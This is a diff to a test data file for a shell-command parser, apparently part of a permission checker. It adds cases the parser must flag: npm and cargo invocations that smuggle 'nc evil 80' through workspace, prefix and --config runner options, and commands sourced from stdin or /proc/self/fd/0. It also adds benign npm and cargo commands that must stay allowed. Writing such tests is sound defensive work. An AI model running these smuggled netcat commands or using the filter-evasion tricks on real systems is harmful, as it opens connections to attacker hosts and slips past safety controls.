@@ -191,6 +191,16 @@ DYNAMIC_COMMAND_WORD = [
     'npx -p "$P" x',
     "cargo watch -s 'nc evil 80'",
     "cargo watch -x test",
+    "npm -w x exec -c 'nc evil 80'",
+    "npm --prefix x exec -c 'nc evil 80'",
+    "npm --workspace=x x --call nc",
+    "npm --bogus exec -c nc",
+    "cargo --config 'target.x.runner=\"nc evil 80\"' test",
+    "cargo test --config=build.rustc=nc",
+    "source /dev/stdin <<< 'GIT_DIR=x'; git status",
+    "source <(cat f)",
+    ". /dev/fd/0",
+    "source /proc/self/fd/0",
 ]
 
 # Must stay allowed by the parser after the #1753 hardening.
@@ -221,6 +231,10 @@ MUST_PARSE = {
     'npx eslint -c cfg.json "$F"': ["npx"],
     "npm exec --yes -- tsc": ["npm"],
     "cargo test": ["cargo"],
+    "npm -w x exec --yes -- tsc": ["npm"],
+    "npm --prefix web run build": ["npm"],
+    "npm test": ["npm"],
+    "cargo --config ci.toml test": ["cargo"],
     "ls > out.txt 2>&1": ["ls"],
     'ls > "$LOG"': ["ls"],
     "git status > $(echo f)": ["git", "echo"],
